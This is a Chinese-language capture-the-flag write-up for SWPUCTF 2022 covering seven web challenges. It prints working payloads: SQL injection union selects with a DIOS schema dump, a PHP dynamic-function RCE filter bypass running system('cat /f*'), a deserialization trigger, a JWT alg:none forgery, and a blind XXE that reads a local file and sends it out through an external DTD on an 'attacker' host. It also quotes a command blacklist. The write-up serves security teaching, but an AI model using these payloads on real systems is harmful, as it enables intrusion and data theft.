---
title: 2022 SWPUCTF Web Writeup
contest: SWPUCTF 2022
year: 2022
difficulty: medium
vuln_type: [sqli, rce, web_unknown, deserialize, lfi, xxe, jwt, auth_bypass]
tags: [SWPUCTF, DIOS, union-select, system, $_GET, XFF, unserialize, __destruct, JWT, XXE, Blind-XXE, CyberChef]
attack_chain: ["Web F12: <!-- swpu{da45af69-6aaf-48cb-affc-4f424da5651f} -->", "easy_sql: ?wllm= 参数 + order by 4# → 3 列 → union select 1,2,3 → DIOS 拿表 fllaag", "happy_rce: cookie admin=1 include next.php → 访问 jiangnaij.php → 绕过 cat/flag 过滤用 $_GET 动态调 system", "/jiangnaij.php?url=$_GET[Tao]($_GET[c]);&Tao=system&c=cat+/f*", "do_not_wakeup: PHP 反序列化 __destruct 触发 getenv('FLAG')", "Genius_system: JWT alg:none 伪造 admin 权限", "websec_xxe: Blind XXE OOB 读 flag 实体", "finalrce: $_GET[1]($_POST[2]) 动态调用 + XFF 头"]
key_payload: "/jiangnaij.php?url=$_GET[Tao]($_GET[c]);&Tao=system&c=cat+/f*"
one_liner: SWPUCTF 2022 8 大题：F12 + 联合注入 + RCE 字符绕过 + 反序列化 + JWT + XXE
lesson: PHP `$_GET[$x]($y)` 动态调用绕 cat/flag 过滤是经典；JWT alg:none 是入门 web
quality: high
---

# 2022 SWPUCTF Web Writeup

原文 https://www.ctfiot.com/65440.html

## Web 1: 欢迎来到 Web 安全
F12 → Source code：
```html
<!-- swpu{da45af69-6aaf-48cb-affc-4f424da5651f} -->
```

## Web 2: easy_sql
```sql
/?wllm=' order by 4#  -- Unknown column '4'
/?wllm=' union select 1,2,3#
-- 回显: Login name: 2, Password: 3

/?wllm=' union select 1,2,(select (@) from (select(@:=0x00),(select(@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
```
- DIOS (Data Injection One Shot) 一把梭
- 表：`test_db.test_tb.fllaag`
- `/?wllm=' union select 1,2,(select fllaag from test_tb)#`

## Web 3: happy_rce
```php
if (isset($_POST['url'])) {
    if ($_COOKIE['admin'] == 1) include "./next.php";
    else echo "怎么吃到只剩一个小饼干？？";
}
```
```http
POST /happy_rce.php
Cookie: admin=1
url=xxx
```
访问 `next.php` → 重定向 `jiangnaij.php`：
```php
$ip = $_GET['url'];
if (preg_match("/cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|x09|x26|>|<|\\$/i", $ip)) {
    // ...
}
```
- 过滤了 cat/flag/数字/通配
- **未过滤 `$`, `_`, `[]`, `()`** → `$_GET[Tao]($_GET[c])` 动态调用
```http
/jiangnaij.php?url=$_GET[Tao]($_GET[c]);&Tao=system&c=cat+/f*
```

## Web 4: do_not_wakeup
```php
class A {
    private $are_you_a_hacker;
    public function __destruct() {
        if ($this->are_you_a_hacker == 'yesyesyes') {
            echo getenv('FLAG');
        } else {
            echo 'Night Night, Makka Pakka';
        }
    }
}
```
- 反序列化触发 `__destruct`：
```php
$a = new A();
$a->are_you_a_hacker = 'yesyesyes';
echo urlencode(serialize($a));
```

## Web 5: Genius_system
- JWT `alg: none` 伪造
- 移除签名 → 改 role 为 admin

## Web 6: websec_xxe
- Blind XXE OOB：
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///flag">
  <!ENTITY % dtd SYSTEM "http://attacker/dtd">
  %dtd;
]>
```
- external DTD 把 %xxe 数据外带

## Web 7: finalrce
- `$_GET[1]($_POST[2])` 动态函数调用
- XFF 头绕过 IP 限制

## 教学价值
- **F12 看 HTML 注释** 是 CTF 入门
- **DIOS (Data Injection One Shot)** 一把梭全库表
- **PHP `$_GET[$x]($y)`** 绕过 cat/flag 关键字黑名单
- **`__destruct` 触发** 反序列化 RCE
- **JWT alg:none** 是 2017 经典漏洞
- **Blind XXE OOB** 是 XXE 高级
- **动态函数调用** 几乎所有语言都有

## 工具
- Burp
- CyberChef
- jwt_tool
- pwntools
- ysoserial

## 关联
- SWPU 是西南石油大学 CTF
- web 方向是国产高校主流方向
